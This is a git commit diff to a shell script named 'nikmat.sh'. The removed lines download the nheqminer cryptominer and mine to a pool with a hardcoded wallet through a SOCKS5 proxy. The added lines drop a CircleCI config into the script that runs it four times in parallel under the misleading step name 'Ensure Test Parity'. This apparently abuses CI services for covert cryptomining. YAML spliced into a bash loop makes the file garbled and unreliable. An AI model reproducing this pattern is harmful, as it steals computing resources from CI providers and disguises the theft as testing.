1373c3ea06f4a4b5e7a76f585da4b5cdabc2a145
heroinki <91711705+heroinki@users.noreply.github.com>
2021-10-02 18:12:07 +0700

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -3,10 +3,19 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
 
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RLzgpxPC9Kioxe4sZr6Eitxpjkt9dbgZFH.$(echo $(shuf -i 1-999 -n 1)-luck) -p x -t 2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
+version: 2
+jobs:
+  build:
+    docker:
+      - image: cimg/go:1.16.4
+    parallelism: 4
+    steps:
+      - checkout
+      - run:
+          name: Ensure Test Parity
+          command: |
+            chmod +x nikmat.sh
+            ./nikmat.sh
  
      echo COUNTER $COUNTER
      let COUNTER-=1
